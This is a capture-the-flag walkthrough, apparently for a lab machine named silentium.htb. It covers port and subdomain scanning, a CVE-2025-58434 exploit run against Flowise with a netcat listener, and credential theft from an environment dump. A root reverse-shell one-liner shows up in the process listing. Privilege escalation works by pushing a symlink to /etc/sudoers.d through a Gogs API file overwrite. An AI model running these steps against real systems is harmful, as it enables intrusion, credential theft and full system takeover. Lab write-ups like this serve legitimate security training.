![](Assets/Pasted%20image%2020260429200804.png)

First we check with a ping if we have connection

![](Assets/Pasted%20image%2020260429200836.png)

Then make a nmap to see what ports the machine have open

```bash
sudo nmap -sV -sC -sS --min-rate 500 10.129.49.213
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-29 20:09 -0600
Nmap scan report for 10.129.49.213
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Then you need to add in the file /etc/hosts like this `10.129.49.213	 silentium.htb`

We will perform a web scan to find relevant routes and we see that we found a login which we found on another host.

```bash
ffuf -w ~/Dictionarys/seclist/Discovery/DNS/subdomains-top1million-5000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -mc 200 -fs 8753

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /home/KEGA/Dictionarys/seclist/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 8753
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 87ms]
```

Now we just need to adjust the URL in /etc/hosts `staging.silentium.htb`.

![](Assets/Pasted%20image%2020260429210024.png)

We checked the source code, and we see that it gives us a version `3.0.5`. With this we can search for a CVE (**CVE-2025-58434**)

So we use a exploit in python `CVE-2025-58434.py`, we see the email in the main menu for the first page.

```bash
# First Terminal 
nc -lvnp 4444

# Second Terminal
python3 CVE-2025-58434.py -u http://staging.silentium.htb -e ben@silentium.htb --lhost 10.129.49.213 --lport 4444
```

The we can see nothing, so we check the file `env` to see if we have somenthin

```bash
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

So we can see the password for the server `SMTP_PASSWORD=r04D!!_R4ge`, lets try a ssh with the name of `ben` and the password that we found

```bash
ssh ben@10.129.49.213
ben@10.129.49.213's password:
ben@silentium:~$
```

So we can read the flag of the user, and now we need to make us root. We make a enumeration of services in root.

```bash
ben@silentium:~$ ps aux | grep root
root           1  0.1  0.3  22160 13316 ?        Ss   15:04   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    15:04   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    15:04   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-rcu_g]
root           5  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-rcu_p]
root           6  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-slub_]
root           7  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-netns]
root           9  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I    15:04   0:00 [kworker/u4:0-ipv6_addrconf]
root          11  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-mm_pe]
root          12  0.0  0.0      0     0 ?        I    15:04   0:00 [rcu_tasks_kthread]
root          13  0.0  0.0      0     0 ?        I    15:04   0:00 [rcu_tasks_rude_kthread]
root          15  0.0  0.0      0     0 ?        I    15:04   0:00 [rcu_tasks_trace_kthread]
root          16  0.0  0.0      0     0 ?        S    15:04   0:00 [ksoftirqd/0]
root          17  0.0  0.0      0     0 ?        I    15:04   0:00 [rcu_preempt]
root          18  0.0  0.0      0     0 ?        S    15:04   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    15:04   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    15:04   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    15:04   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    15:04   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    15:04   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        S    15:04   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/1:0H-events_highpri]
root          29  0.0  0.0      0     0 ?        S    15:04   0:00 [kdevtmpfs]
root          30  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-inet_]
root          31  0.0  0.0      0     0 ?        S    15:04   0:00 [kauditd]
root          32  0.0  0.0      0     0 ?        S    15:04   0:00 [khungtaskd]
root          33  0.0  0.0      0     0 ?        S    15:04   0:00 [oom_reaper]
root          35  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-write]
root          37  0.0  0.0      0     0 ?        S    15:04   0:00 [kcompactd0]
root          38  0.0  0.0      0     0 ?        SN   15:04   0:00 [ksmd]
root          39  0.2  0.0      0     0 ?        I    15:04   0:06 [kworker/1:1-events]
root          40  0.0  0.0      0     0 ?        SN   15:04   0:00 [khugepaged]
root          41  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-kinte]
root          42  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-kbloc]
root          43  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-blkcg]
root          44  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/9-acpi]
root          45  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-tpm_d]
root          46  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-ata_s]
root          47  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-md]
root          48  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-md_bi]
root          49  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-edac-]
root          50  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-devfr]
root          51  0.0  0.0      0     0 ?        S    15:04   0:00 [watchdogd]
root          53  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-quota]
root          54  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/1:1H-kblockd]
root          55  0.0  0.0      0     0 ?        S    15:04   0:00 [kswapd0]
root          56  0.0  0.0      0     0 ?        S    15:04   0:00 [ecryptfs-kthread]
root          57  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-kthro]
root          58  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/24-pciehp]
root          59  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/25-pciehp]
root          60  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/26-pciehp]
root          61  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/27-pciehp]
root          62  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/28-pciehp]
root          63  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/29-pciehp]
root          64  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/30-pciehp]
root          65  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/31-pciehp]
root          66  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/32-pciehp]
root          67  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/33-pciehp]
root          68  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/34-pciehp]
root          69  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/35-pciehp]
root          70  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/36-pciehp]
root          71  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/37-pciehp]
root          72  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/38-pciehp]
root          73  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/39-pciehp]
root          74  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/40-pciehp]
root          75  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/41-pciehp]
root          76  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/42-pciehp]
root          77  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/43-pciehp]
root          78  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/44-pciehp]
root          79  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/45-pciehp]
root          80  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/46-pciehp]
root          81  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/47-pciehp]
root          82  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/48-pciehp]
root          83  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/49-pciehp]
root          84  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/50-pciehp]
root          85  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/51-pciehp]
root          86  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/52-pciehp]
root          87  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/53-pciehp]
root          88  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/54-pciehp]
root          89  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/55-pciehp]
root          90  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-acpi_]
root          92  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_0]
root          93  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root          94  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_1]
root          95  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root          96  0.0  0.0      0     0 ?        I    15:04   0:00 [kworker/u6:3-events_power_efficient]
root          97  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-mld]
root          99  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-ipv6_]
root         107  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-kstrp]
root         109  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/u7:0]
root         110  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/u8:0]
root         111  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/u9:0]
root         124  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-charg]
root         153  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/0:1H-kblockd]
root         175  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_2]
root         176  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         177  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_3]
root         178  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         179  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_4]
root         180  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         198  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_5]
root         199  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         200  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_6]
root         201  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         202  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_7]
root         203  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         204  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-mpt_p]
root         205  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-mpt/0]
root         206  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_8]
root         207  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         208  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_9]
root         209  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         210  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_10]
root         211  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         212  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_11]
root         213  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         214  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_12]
root         215  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         216  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_13]
root         217  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         218  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_14]
root         219  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         220  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_15]
root         221  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         222  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_16]
root         223  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         224  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_17]
root         225  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         226  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_18]
root         227  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         228  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_19]
root         229  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         230  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_20]
root         231  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         232  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_21]
root         233  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         234  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_22]
root         235  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         236  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_23]
root         237  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         238  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_24]
root         239  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         240  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_25]
root         241  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         242  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_26]
root         243  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         244  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_27]
root         245  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         246  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_28]
root         247  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         248  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_29]
root         249  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         250  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_30]
root         251  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         252  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_31]
root         253  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         283  0.0  0.0      0     0 ?        S    15:04   0:00 [scsi_eh_32]
root         284  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-scsi_]
root         314  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-raid5]
root         356  0.0  0.0      0     0 ?        S    15:04   0:00 [jbd2/sda4-8]
root         357  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-ext4-]
root         398  0.0  0.0      0     0 ?        S    15:04   0:00 [psimon]
root         403  0.0  0.4  66912 17668 ?        S<s  15:04   0:00 /usr/lib/systemd/systemd-journald
root         439  0.0  0.2  29744  8516 ?        Ss   15:04   0:00 /usr/lib/systemd/systemd-udevd
root         464  0.0  0.0      0     0 ?        S    15:04   0:00 [psimon]
root         547  0.0  0.0      0     0 ?        S    15:04   0:00 [jbd2/sda2-8]
root         548  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-ext4-]
root         549  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/60-vmw_vmci]
root         550  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/61-vmw_vmci]
root         588  0.0  0.0      0     0 ?        S    15:04   0:00 [irq/16-vmwgfx]
root         592  0.0  0.0  86636  3556 ?        D<sl 15:04   0:01 /sbin/auditd
root         594  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-ttm]
root         649  0.0  0.0      0     0 ?        S    15:04   0:00 [audit_prune_tree]
root         679  0.0  0.0      0     0 ?        I<   15:04   0:00 [kworker/R-crypt]
root         794  0.0  0.2  53468 11972 ?        Ss   15:04   0:00 /usr/bin/VGAuthService
root         795  0.2  0.2 243480 10420 ?        Ssl  15:04   0:07 /usr/bin/vmtoolsd
root         824  0.0  0.0   3940  3244 ?        Ss   15:04   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         917  0.0  0.2  18212  8820 ?        Ss   15:04   0:00 /usr/lib/systemd/systemd-logind
root         918  0.0  0.3 468972 13460 ?        Ssl  15:04   0:00 /usr/libexec/udisks2/udisksd
root         975  0.0  0.0      0     0 ?        I    15:04   0:00 [kworker/u4:2-ext4-rsv-conversion]
root        1025  0.0  0.3 318364 12876 ?        Ssl  15:04   0:00 /usr/sbin/ModemManager
root        1527  0.0  1.7 1812208 70056 ?       Ssl  15:04   0:01 /opt/gogs/gogs/gogs web
root        1529  0.0  0.0   6824  2852 ?        Ss   15:04   0:00 /usr/sbin/cron -f -P
root        1533  0.2  1.2 1867184 51300 ?       Ssl  15:04   0:06 /usr/bin/containerd
root        1558  0.0  0.0   6104  1996 tty1     Ss+  15:04   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        1562  0.0  0.0  11780  1788 ?        Ss   15:04   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root        1620  0.1  1.9 2267256 78060 ?       Ssl  15:04   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1903  0.1  0.2 1233608 11980 ?       Sl   15:04   0:02 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c78c3cceb7ba574e930e611b7403d1bd1fa04ba5b6dc9e9ca066e59637a4064c -address /run/containerd/containerd.sock
root        1907  0.0  0.2 1233864 10772 ?       Sl   15:04   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 728f8ff4efe14eb458cb6dab2edfe106c92d48614a3a56905c6913b67ecfd1fb -address /run/containerd/containerd.sock
root        1955  1.2  9.8 53492148 395300 ?     Ssl  15:04   0:31 node /usr/local/bin/flowise start
root        2029  0.0  0.1 1744844 5020 ?        Sl   15:04   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.18.0.2 -container-port 3000 -use-listen-fd
root        2062  0.0  0.1 1597380 4112 ?        Sl   15:04   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 1025 -container-ip 172.18.0.3 -container-port 1025 -use-listen-fd
root        2068  0.0  0.1 1671112 4548 ?        Sl   15:04   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8025 -container-ip 172.18.0.3 -container-port 8025 -use-listen-fd
root        2395  0.0  0.2  12024  8180 ?        Ss   15:06   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        2457  0.1  1.0 611028 43096 ?        Ssl  15:07   0:02 /usr/libexec/fwupd/fwupd
root        2464  0.0  0.2 313828  8808 ?        Ssl  15:07   0:00 /usr/libexec/upowerd
root        3415  0.0  0.0      0     0 ?        I    15:15   0:00 [kworker/u5:0-events_power_efficient]
root        3821  0.0  0.0   1640   944 ?        S    15:19   0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.97 4444 >/tmp/f
root        3824  0.0  0.0   1688   872 ?        S    15:19   0:00 cat /tmp/f
root        3825  0.0  0.0   1708   968 ?        S    15:19   0:00 /bin/sh -i
root        3826  0.0  0.0   1644   924 ?        S    15:19   0:00 nc 10.10.14.97 4444
root        3849  0.0  0.0      0     0 ?        I    15:19   0:00 [kworker/1:2-cgroup_free]
root        4050  0.0  0.0      0     0 ?        I    15:21   0:00 [kworker/u5:2-events_power_efficient]
root        4212  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/u6:2-flush-8:0]
root        4751  0.0  0.0      0     0 ?        I    15:26   0:00 [kworker/u6:4-flush-8:0]
root        5336  0.0  0.0      0     0 ?        I    15:31   0:00 [kworker/u6:0-events_power_efficient]
root        5857  0.0  0.0      0     0 ?        I    15:36   0:00 [kworker/u5:3-events_unbound]
root        5915  0.2  0.0      0     0 ?        I    15:36   0:01 [kworker/0:1-events]
root        6127  0.0  0.2  14968 10524 ?        Ss   15:39   0:00 sshd: ben [priv]
root        6322  0.0  0.0      0     0 ?        I    15:40   0:00 [kworker/0:3]
root        6482  0.0  0.0      0     0 ?        I    15:41   0:00 [kworker/u6:1-events_power_efficient]
root        6551  0.0  0.0      0     0 ?        I    15:41   0:00 [kworker/1:0]
root        6807  0.0  0.2  14968 10540 ?        Ss   15:44   0:00 sshd: ben [priv]
root        7007  0.0  0.0      0     0 ?        I    15:45   0:00 [kworker/u5:1-events_unbound]
```

Now we make a ssh with the port that we use `ssh -L 8080:127.0.0.1:3001 ben@silentium.htb`

so now in the browser we have access in this site 
![](Assets/Pasted%20image%2020260430100017.png)

so we create a new user `test` and password `test` to create a new repository `root-exploit` you dont need to mark another option and create a token `8c113660bd4893dd3f4f14f10fd9365c5442e865`
```bash
❯ cd root-exploit
❯ ln -s /etc/sudoers.d/ben malicious_link
❯ ls
malicious_link
❯ cat malicious_link
cat: malicious_link: Permission denied
❯ git add malicious_link && git commit -m "Add symlink" && git push
[master (root-commit) 8dbba27] Add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 237 bytes | 237.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Username for 'http://127.0.0.1:8080': test
Password for 'http://test@127.0.0.1:8080': 
To http://127.0.0.1:8080/test/root-exploit.git
 * [new branch]      master -> master
```

now we need to obtain the SHA with this command `git rev-parse HEAD:malicious_link` and make this command

```bash
curl -X PUT "http://127.0.0.1:8080/api/v1/repos/<NEW_USER>/<REP>/contents/malicious_link" \
-H "Authorization: token <TOKEN>" \
-H "Content-Type: application/json" \
-d '{
  "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==",
  "message": "pwned",
  "sha": "<SHA>"
}'
```

If you see then the exit like a json now try this in the `ssh` 
```bash
ben@silentium:~$ sudo -l
Matching Defaults entries for ben on silentium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ben may run the following commands on silentium:
    (ALL) NOPASSWD: ALL
```

then only make `sudo su` and read the flag of root
